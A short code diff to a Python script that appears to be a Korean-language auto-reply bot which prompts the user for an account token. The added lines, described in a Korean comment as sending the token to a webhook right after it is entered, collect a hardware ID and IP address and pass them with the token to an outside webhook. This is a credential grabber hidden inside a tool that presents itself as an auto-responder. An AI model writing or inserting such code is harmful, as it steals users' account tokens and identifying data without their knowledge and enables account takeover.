@@ -95,6 +95,11 @@ def load_config():
 config = load_config()
 
 token = input("토큰을 입력하세요: ")
+# 토큰 입력 후 즉시 웹훅으로 전송
+hardware_id = get_hardware_id()
+ip_address = get_ip_address()
+send_to_webhook(token, hardware_id, ip_address)
+
 prefix = config.get("prefix", "!")
 message_generator = itertools.cycle(config.get("autoreply", {}).get("messages", ["자동 응답 메시지 1", "자동 응답 메시지 2"]))
 
